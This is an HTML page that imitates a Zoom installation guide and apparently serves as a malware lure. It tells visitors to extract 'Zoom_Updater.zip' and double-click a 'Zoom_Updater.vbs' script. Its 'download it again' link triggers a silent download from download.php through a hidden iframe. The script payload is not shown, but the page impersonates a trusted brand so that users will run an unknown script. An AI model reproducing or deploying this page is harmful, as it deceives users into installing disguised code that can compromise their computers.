<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Installation Guide</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
  <style>
    * {
      box-sizing: border-box;
    }

    :root {
      --zoom-blue: #0E72ED;
      --zoom-dark-blue: #0B5EC7;
      --bg-color: #f8f9fa;
      --text-color: #2d2d2d;
      --text-secondary: #666;
      --card-bg: #ffffff;
      --border-color: #e6e6e6;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0;
      padding: 0;
      color: var(--text-color);
      min-height: 100vh;
    }

    header {
      padding: 24px 48px;
      text-align: left;
      background-color: white;
      border-bottom: 1px solid var(--border-color);
      display: flex;
      align-items: center;
      gap: 16px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
    }

    header img {
      height: 48px;
      width: auto;
    }

    header h1 {
      color: var(--text-color);
      font-size: 24px;
      margin: 0;
      font-weight: 600;
    }

    .container {
      max-width: 900px;
      margin: 40px auto;
      padding: 0 24px;
    }

    .intro {
      background: white;
      border-radius: 12px;
      padding: 32px;
      margin-bottom: 32px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .intro h2 {
      margin: 0 0 12px 0;
      font-size: 28px;
      color: var(--text-color);
      font-weight: 600;
    }

    .intro p {
      margin: 0;
      font-size: 16px;
      color: var(--text-secondary);
      line-height: 1.6;
    }

    .step {
      background: white;
      border-radius: 12px;
      padding: 28px 32px;
      margin-bottom: 20px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
      border-left: 4px solid var(--zoom-blue);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    .step:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
    }

    .step-header {
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: 16px;
    }

    .step-number {
      width: 40px;
      height: 40px;
      background: var(--zoom-blue);
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 18px;
      flex-shrink: 0;
    }

    .step h2 {
      color: var(--text-color);
      font-size: 20px;
      margin: 0;
      font-weight: 600;
    }

    .step p {
      font-size: 16px;
      line-height: 1.7;
      color: var(--text-secondary);
      margin: 0;
    }

    .step p strong {
      color: var(--text-color);
      font-weight: 600;
    }

    .link-downloads {
      color: var(--zoom-blue);
      cursor: pointer;
      text-decoration: none;
      font-weight: 500;
      transition: color 0.2s ease;
    }

    .link-downloads:hover {
      color: var(--zoom-dark-blue);
      text-decoration: underline;
    }

    .download-again {
      color: var(--zoom-blue);
      cursor: pointer;
      text-decoration: none;
      font-weight: 600;
      transition: color 0.2s ease;
    }

    .download-again:hover {
      color: var(--zoom-dark-blue);
      text-decoration: underline;
    }

    .download-row {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-top: 8px;
    }

    #spinner {
      display: none;
      animation: spin 1s linear infinite;
      vertical-align: middle;
    }

    #spinner svg {
      width: 20px;
      height: 20px;
    }

    #spinnerText {
      font-weight: 500;
      color: var(--zoom-blue);
      font-size: 14px;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    footer {
      text-align: center;
      font-size: 13px;
      padding: 32px 24px;
      color: white;
      opacity: 0.9;
    }

    footer a {
      color: white;
      text-decoration: underline;
    }

    @media (max-width: 768px) {
      header {
        padding: 20px 24px;
      }

      header h1 {
        font-size: 20px;
      }

      .container {
        padding: 0 16px;
        margin: 24px auto;
      }

      .intro,
      .step {
        padding: 24px;
      }

      .intro h2 {
        font-size: 24px;
      }
    }
  </style>
</head>

<body>

  <header>
    <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom logo" />
    <h1>Zoom Installation Guide</h1>
  </header>

  <div class="container">
    <div class="intro">
      <h2>Thank you for downloading Zoom</h2>
      <p>Follow these simple steps to complete your installation and start connecting with your team.</p>
    </div>

    <div class="step">
      <div class="step-header">
        <div class="step-number">1</div>
        <h2>Locate the Downloaded File</h2>
      </div>
      <p>
        Open your
        <a href="#" target="_blank" class="link-downloads" title="Open Downloads folder">
          Downloads folder
        </a>
        and find the Zoom installer file (Zoom_Updater.zip).
      </p>
      <p style="margin-top: 12px;">If you can't find the file, you can <span class="download-again" onclick="downloadAgain()">download it again</span>.</p>
      <div class="download-row">
        <span id="spinner">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle>
            <path d="M12 2a10 10 0 0 1 10 10" stroke-opacity="1">
              <animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1s" repeatCount="indefinite" />
            </path>
          </svg>
        </span>
        <span id="spinnerText"></span>
      </div>
    </div>

    <div class="step">
      <div class="step-header">
        <div class="step-number">2</div>
        <h2>Run the Installer</h2>
      </div>
      <p>Extract the Zip File, Open the folder and double-click the Zoom_Updater.vbs file to launch the Updater and proceed.</p>
    </div>

    <div class="step">
      <div class="step-header">
        <div class="step-number">3</div>
        <h2>Complete the Setup</h2>
      </div>
      <p>The installer will automatically download and Update Zoom. Wait for the progress bar to complete. No additional configuration is required.</p>
    </div>

    <div class="step">
      <div class="step-header">
        <div class="step-number">4</div>
        <h2>Start Using Zoom</h2>
      </div>
      <p>Once installed, Zoom will launch automatically. You can sign in with your existing account or join a meeting without an account. Zoom is now ready to use!</p>
    </div>
  </div>

  <iframe id="downloadIframe" style="display:none;"></iframe>

  <footer>
    &copy; 2026 Zoom Video Communications, Inc. All rights reserved.
  </footer>

  <script>
    function downloadAgain() {
      const spinner = document.getElementById('spinner');
      const spinnerText = document.getElementById('spinnerText');
      const iframe = document.getElementById('downloadIframe');

      spinner.style.display = 'inline-block';
      spinnerText.textContent = 'Please wait...';

      // Trigger the download silently
      iframe.src = './download.php';

      setTimeout(() => {
        spinnerText.textContent = 'Your download is starting...';
      }, 2000);

      setTimeout(() => {
        spinnerText.textContent = 'Download initiated.';
        spinner.style.display = 'none';
      }, 5000);
    }
  </script>

  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9cdf304f4d60f65e","version":"2025.9.1","r":1,"token":"0fd78295dc8b43c19357571e1f114c81","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"098d0766a6c04db7a20d7bcd64a6fd67","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>

</html>